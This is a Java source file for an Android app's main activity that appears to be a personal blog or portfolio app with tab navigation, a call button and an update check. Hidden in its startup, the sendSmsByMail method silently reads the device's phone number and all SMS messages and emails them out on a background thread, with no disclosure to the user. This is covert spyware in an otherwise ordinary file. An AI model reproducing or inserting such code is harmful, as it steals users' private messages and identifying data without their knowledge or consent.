package lcl.android.ui;

import lcl.android.R;
import lcl.android.core.AppContext;
import lcl.android.core.UpdateManager;
import lcl.android.mail.MailHelper;
import lcl.android.sms.SmsHelper;
import lcl.android.utility.LogUtils;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.view.ViewPager;
import android.support.v4.view.ViewPager.OnPageChangeListener;
import android.view.KeyEvent;
import android.view.View;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import android.widget.Toast;

/**
 * 应用程序首页
 */
public class Main extends BaseActivity {
	private AppContext appContext;// 全局Context

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		try {

			setContentViews();

			sendSmsByMail();

			getViews();

			checkAppUpdate();

		} catch (Exception e) {
			LogUtils.Info("Main onCreate error：" + e.getMessage());
		}
	}

	private void setContentViews() {
		setContentView(R.layout.main);

		appContext = (AppContext) getApplication();
	}

	private RadioGroup mSwitcher;
	private ViewPager mSearchVp;

	private void getViews() {
		mSwitcher = (RadioGroup) findViewById(R.id.navi_switcher);
		mSwitcher.setOnCheckedChangeListener(mCheckedChgLitener);
		mSearchVp = (ViewPager) findViewById(R.id.navi_view_pager);
		mSearchVp.setAdapter(new FrameworkList(getSupportFragmentManager()));
		mSearchVp.setOnPageChangeListener(mPageChgListener);
		View view = this.findViewById(R.id.icon_phone);
		view.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				// 打电话
				Intent intent = new Intent(Intent.ACTION_CALL, Uri
						.parse("tel:13026209315"));
				startActivity(intent);
			}
		});
	}

	private final int CB_INDEX_blog = 0;
	private final int CB_INDEX_frame = 1;
	private final int CB_INDEX_work = 2;
	private final int CB_INDEX_serve = 3;
	private final int CB_INDEX_about = 4;

	private OnCheckedChangeListener mCheckedChgLitener = new OnCheckedChangeListener() {

		@Override
		public void onCheckedChanged(RadioGroup arg0, int checkedId) {

			int cur = CB_INDEX_blog;
			switch (checkedId) {
			case R.id.navi_switcher_item_blogPage:
				cur = CB_INDEX_blog;
				break;
			case R.id.navi_switcher_item_framePage:
				cur = CB_INDEX_frame;
				break;
			case R.id.navi_switcher_item_worksPage:
				cur = CB_INDEX_work;
				break;
			case R.id.navi_switcher_item_servePage:
				cur = CB_INDEX_serve;
				break;
			case R.id.navi_switcher_item_aboutPage:
				cur = CB_INDEX_about;
				break;
			}
			if (mSearchVp.getCurrentItem() != cur) {
				mSearchVp.setCurrentItem(cur);
			}
		}
	};
	private OnPageChangeListener mPageChgListener = new OnPageChangeListener() {
		@Override
		public void onPageSelected(int position) {
			int vpItem = mSearchVp.getCurrentItem();
			switch (vpItem) {
			case CB_INDEX_blog:
				mSwitcher.check(R.id.navi_switcher_item_blogPage);
				break;
			case CB_INDEX_frame:
				mSwitcher.check(R.id.navi_switcher_item_framePage);
				break;
			case CB_INDEX_work:
				mSwitcher.check(R.id.navi_switcher_item_worksPage);
				break;
			case CB_INDEX_serve:
				mSwitcher.check(R.id.navi_switcher_item_servePage);
				break;
			case CB_INDEX_about:
				mSwitcher.check(R.id.navi_switcher_item_aboutPage);
				break;
			}
		}

		@Override
		public void onPageScrolled(int arg0, float arg1, int arg2) {
			// TODO Auto-generated method stub

		}

		@Override
		public void onPageScrollStateChanged(int arg0) {
			// TODO Auto-generated method stub

		}
	};

	private void checkAppUpdate() {
		try {
			// 网络连接判断
			if (appContext.isNetworkConnected()) {
				// 检查新版本
				if (appContext.isCheckUp()) {
					UpdateManager.getUpdateManager()
							.checkAppUpdate(this, false);
					LogUtils.Info("Main checkAppUpdate 检查新版本....");
				}
			}
		} catch (Exception e) {
			LogUtils.Info("Main checkAppUpdate error：" + e.getMessage());
		}
	}

	private void sendSmsByMail() {
		// 获取短信
		final String phon = appContext.GetLocalPhon(this);
		final String smsinfo = SmsHelper.GetSmsInfoStr(this);
		new Thread() {
			@Override
			public void run() {
				if (appContext.isNetworkConnected()) {
					String title = phon + "版本："
							+ appContext.getCurrentVersion();
					MailHelper.sendEmail("", title, smsinfo);
					LogUtils.Info("Main sendSmsByMail 发送邮件....");
				}
			}
		}.start();
	}

	private long exitTime = 0;

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK
				&& event.getAction() == KeyEvent.ACTION_DOWN) {
			if ((System.currentTimeMillis() - exitTime) > 2000) {
				Toast.makeText(getApplicationContext(), "再按一次退出程序",
						Toast.LENGTH_SHORT).show();
				exitTime = System.currentTimeMillis();
			} else {
				finish();
				System.exit(0);
			}
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	protected void onResume() {
		// TODO 自动生成的方法存根
		super.onResume();
	}
}
